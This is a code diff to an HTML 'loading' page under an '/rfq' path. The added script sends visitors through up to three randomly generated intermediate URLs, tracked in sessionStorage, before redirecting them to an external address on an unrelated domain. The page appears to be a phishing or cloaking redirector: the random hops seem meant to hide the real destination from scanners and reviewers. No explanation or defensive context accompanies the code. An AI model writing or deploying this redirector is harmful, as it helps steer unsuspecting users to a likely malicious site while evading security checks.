@@ -152,13 +152,47 @@
 
     <script>
       (function () {
+        var basePath = "/rfq";
         var finalUrl = "https://liberalization652.apexdrift.app/448orthodoxy/";
         var loadingDelayMs = 7000;
+        var maxRandomRedirects = 3;
+        var minRandomPathLength = 10;
+        var storageKey = "rfqRedirectStep";
+        var alphabet = "abcdefghijklmnopqrstuvwxyz0123456789";
+        var tokenPattern = new RegExp("^" + basePath + "/[A-Za-z0-9]{" + minRandomPathLength + ",}/?$");
+        var currentPath = window.location.pathname.replace(/\/+$/, "");
         var progressBar = document.getElementById("loading-progress");
         var startedAt = Date.now();
         var requestFrame = window.requestAnimationFrame || function (callback) {
           return window.setTimeout(callback, 16);
         };
+
+        function generateRandomPath() {
+          var randomString = "";
+
+          for (var index = 0; index < minRandomPathLength; index += 1) {
+            randomString += alphabet.charAt(Math.floor(Math.random() * alphabet.length));
+          }
+
+          return basePath + "/" + randomString;
+        }
+
+        function isInitialPath() {
+          return currentPath === basePath || currentPath === basePath + "/index.html";
+        }
+
+        function redirectToNextStep() {
+          var currentStep = Number(window.sessionStorage.getItem(storageKey) || "0");
+
+          if (currentStep < maxRandomRedirects) {
+            window.sessionStorage.setItem(storageKey, String(currentStep + 1));
+            window.location.replace(generateRandomPath());
+            return;
+          }
+
+          window.sessionStorage.removeItem(storageKey);
+          window.location.replace(finalUrl);
+        }
 
         function updateProgress() {
           var elapsedMs = Date.now() - startedAt;
@@ -171,10 +205,20 @@
           }
         }
 
+        if (!isInitialPath()) {
+          if (!tokenPattern.test(window.location.pathname)) {
+            window.sessionStorage.setItem(storageKey, "0");
+          }
+
+          redirectToNextStep();
+          return;
+        }
+
+        window.sessionStorage.setItem(storageKey, "0");
         updateProgress();
         window.setTimeout(function () {
           progressBar.style.width = "100%";
-          window.location.replace(finalUrl);
+          redirectToNextStep();
         }, loadingDelayMs);
       }());
     </script>
